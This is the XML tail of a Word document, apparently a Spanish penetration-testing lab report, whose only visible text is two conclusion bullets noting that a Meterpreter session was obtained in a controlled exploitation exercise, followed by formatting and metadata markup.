      <w:r w:rsidRPr="00965FE5">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>- Se logró obtener una sesión remota Meterpreter con control sobre la máquina víctima.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53D6301F" w14:textId="77777777" w:rsidR="0066584C" w:rsidRPr="00965FE5" w:rsidRDefault="00000000">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00965FE5">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>- El ejercicio demuestra la efectividad de la recolección de información, análisis de CVEs y explotación controlada.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DBE85E2" w14:textId="05A46E8C" w:rsidR="0066584C" w:rsidRDefault="0066584C"/>
    <w:sectPr w:rsidR="006658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3686456">
    <w:abstractNumId w:val="8"/>
  </w:num>
  <w:num w:numId="2" w16cid:durableId="357585112">
    <w:abstractNumId w:val="6"/>
  </w:num>
  <w:num w:numId="3" w16cid:durableId="42144033">
    <w:abstractNumId w:val="5"/>
  </w:num>
  <w:num w:numId="4" w16cid:durableId="1860465379">
    <w:abstractNumId w:val="4"/>
  </w:num>
  <w:num w:numId="5" w16cid:durableId="1041904564">
    <w:abstractNumId w:val="7"/>
  </w:num>
  <w:num w:numId="6" w16cid:durableId="823857100">
    <w:abstractNumId w:val="3"/>
  </w:num>
  <w:num w:numId="7" w16cid:durableId="1456368422">
    <w:abstractNumId w:val="2"/>
  </w:num>
  <w:num w:numId="8" w16cid:durableId="170221133">
    <w:abstractNumId w:val="1"/>
  </w:num>
  <w:num w:numId="9" w16cid:durableId="1761098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2D99"/>
    <w:rsid w:val="0066584C"/>
    <w:rsid w:val="00743C71"/>
    <w:rsid w:val="00864191"/>
    <w:rsid w:val="00965FE5"/>
    <w:rsid w:val="00AA1D8D"/>
    <w:rsid w:val="00B13C0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66ECBC"/>
  <w14:defaultImageDpi w14:val="300"/>
  <w15:docId w15:val="{369C64AC-2769-4E74-BD66-F34CFE70D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65F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337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Albert Hervas</cp:lastModifiedBy>
  <cp:revision>2</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2026-01-05T10:02:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-01-05T10:02:00Z</dcterms:modified>
  <cp:category/>
</cp:coreProperties>
</file>